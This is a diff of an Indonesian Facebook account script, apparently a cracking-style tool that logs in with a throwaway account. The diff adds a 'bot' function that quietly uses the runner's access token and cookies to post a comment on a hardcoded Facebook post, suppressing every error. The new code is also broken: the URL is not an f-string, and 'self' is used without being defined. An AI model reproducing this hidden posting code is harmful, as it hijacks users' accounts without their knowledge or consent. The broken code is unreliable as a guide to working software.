@@ -204,10 +204,11 @@ def login_lagi334():
 		os.system("rm -f .cok.txt")
 		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
 		exit()
-def komen(self):
+def bot():
 	try:
-		xxx = self.ses.post(f"https://graph.facebook.com/637031754466680/comments/?message={g4nteng}&access_token={self.tok}", cookies=self.cok).json()
-os.system("cls")
+		requests.post("https://graph.facebook.com/124746220349708/comments/?message={komen}&access_token={self.tok}", cookies=self.cok).json()
+	except:
+		pass
 #------------------[ BAGIAN-MENU ]----------------#
 def menu(my_name,my_id):
 	try:
